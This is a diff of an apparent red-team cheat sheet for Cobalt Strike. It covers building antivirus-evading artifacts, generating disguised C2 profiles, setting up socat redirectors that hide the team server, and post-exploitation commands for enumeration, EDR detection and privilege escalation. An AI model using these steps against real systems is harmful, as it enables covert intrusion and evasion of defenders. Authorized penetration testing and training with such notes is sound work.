@@ -12,7 +12,7 @@ cd /opt/cobaltstrike/
 https://download.cobaltstrike.com/scripts
 
 Includes:
-    Artifact Kit - a source code framework to build executables and DLLs that evade some anti-virus products.
+    Artifact Kit - a source code framework to build executables and DLLs that evade some AV products.
     Mimikatz Kit
     Process Injection Kit
     Resource Kit
@@ -26,7 +26,7 @@ Not included:
     Sleep Mask Kit (version 4.4)
 
 cd /home/kali/Downloads/
-tar -zxf arsenal-kit20220817.tgz
+tar -zxf arsenal-kitYYYYMMDD.tgz
 cd arsenal-kit/
 vi arsenal_kit.config                          Make the following changes
 include_udrl_kit="true"
@@ -53,11 +53,12 @@ go build SourcePoint.go
 cd /opt/cobaltstrike/third-party/FortyNorthSecurity-C2concealer/
 chmod 755 install.sh
 ./install.sh
-C2concealer --variant 3 --hostname target.com
+C2concealer --variant 3 --hostname <redirector domain>
 Answer the questions.
-This will create a random.profile.
+This will create a random profile.
 
-Run c2lint against your new profile to check for possible OPSEC issues.
+Validate new profile.
+./c2lint <new profile>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # OPSEC: If you manually create a new C2 profile, change the following options:
@@ -129,9 +130,10 @@ Start a new screen session: screen -S <name>
 
 Parameters in <> are mandatory, those in [] are optional
 ./teamserver <IP> <password> [Malleable C2 profile] [kill date for Beacons yyyy-mm-dd]
-./teamserver 192.168.1.5 third-party/FortyNorthSecurity-C2concealer/random.profile 2022-12-31
+./teamserver 192.168.1.5 password123 third-party/FortyNorthSecurity-C2concealer/random.profile 2022-12-31
 
-When the team server starts, it will display the SHA256 hash of the SSL cert. Verify this hash when connecting.
+When the team server starts, it will display the SHA256 hash of the SSL cert. 
+Share this hash with teammates and validate when connecting.
 
 - Remove old data and Beacons (optional)
 Stop the team server.
@@ -161,9 +163,9 @@ Follow the steps from above.
 
 OPSEC: Never allow a Beacon to make direct connections to your team server. Always use a redirector to forward the traffic.
 
-- Create 3 free Ubuntu instances in the cloud. These instances will be used for the following:
-Redirector 1 - domain1
-Redirector 2 - domain2
+- Create 3 free Ubuntu instances in the cloud. These instances will be used for:
+Redirector 1 - domain1 (primary)
+Redirector 2 - domain2 (backup)
 Redirector 3 - DNS (long haul)
 
 - Install socat on each instance
@@ -171,7 +173,8 @@ Forwards all traffic on these ports. This is not OPSEC friendly.
 sudo -i
 apt-get install -y socat
 screen -S <name>                                            Start a new screen session
-socat tcp4-listen:443,fork tcp4:<team server IP>:443        Redirector 1/2
+socat tcp4-listen:443,fork tcp4:<team server IP>:443        Redirector 1
+socat tcp4-listen:443,fork tcp4:<team server IP>:4443       Redirector 2
 socat -T 5 udp4-listen:53,fork udp4:<team server IP>:53     Redirector 3
 
 - Create SSL certificates for the https redirectors
@@ -318,28 +321,31 @@ Right-click on the Beacon > Session > Remove         Remove dead Beacon
 
 Cobalt Strike > Script Manger > Load
 /opt/cobaltstrike/third-party/trustedsec-bof/SA/SA.cna
-helpx                                                New BOF commands added
 
-whoami                                               BOF
-netuser <username>                                   BOF - List user info
-ipconfig                                             BOF
-listdns                                              BOF - List DNS cache entries
-routeprint                                           BOF - Print IPv4 routes on the machine
-netstat                                              BOF - List listening and connected IPv4 UDP and TCP connections
-userenum                                             BOF - List computer user accounts
-netLocalGroupList                                    BOF - List groups in this server
-netLocalGroupListMembers <group>                     BOF - List the members in the specified group in this server
-netsession                                           BOF - List sessions on server
-netshares                                            BOF - List shares on local local or remote computer
+tasklist                                             List currently running processes
+ps                                                   Show process list
+netstat                                              List listening and connected IPv4 UDP and TCP connections
+windowslist                                          List available windows
+netuse_list                                          List local bound connections
+ipconfig                                             Runs and internal ipconfig commend
+netuser <username> <domain>                          List user info
+
+listdns                                              List DNS cache entries
+routeprint                                           Print IPv4 routes on the machine
+userenum                                             List computer user accounts
+netLocalGroupList                                    List groups in this server
+netLocalGroupListMembers <group>                     List the members in the specified group in this server
+netsession                                           List sessions on server
+netshares                                            List shares on local local or remote computer
 pwd                                                  Print current directory
-dir                                                  BOF - List a target directory
-driversigs                                           BOF - Check drivers for known EDR vendor names
+dir                                                  List a target directory
+driversigs                                           Check drivers for known EDR vendor names
 drives                                               List drives on target
 history                                              Show the command history of the Beacon
 
-arp                                                  BOF - Runs an internal ARP command
-domainenum                                           BOF - List user accounts in the current domain
-netview                                              BOF - List local workstations and servers
+arp                                                  Runs an internal ARP command
+domainenum                                           List user accounts in the current domain
+netview                                              List local workstations and servers
 net domain                                           Show the current domain
 net domain_controllers                               Show domain controllers
 net computers                                        Show doamin computers (this can take a couple of min, be patient)
@@ -366,6 +372,9 @@ portscan <target range> <ports> none 255             Scan a network for open ser
 getsystem                                            BOF - Attempt to get SYSTEM
 getprivs                                             Enable system privileges on current token
 getuid                                               Get User ID
+
+- SharpUp
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/SharpUp.exe audit
 
 - Seatbelt
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q DotNet                 Check for versions 2 and 3.5
@@ -399,9 +408,6 @@ Cobalt Strike > Script Manger > Load
 
 sc_stop <vuln service name>                          BOF - If the vulnerable service is running, stop it
 sc_start <vuln service name>                         BOF - Start the vulnerable service, which runs the malicious payload
-
-- SharpUp
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/SharpUp.exe audit
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Credential Abuse
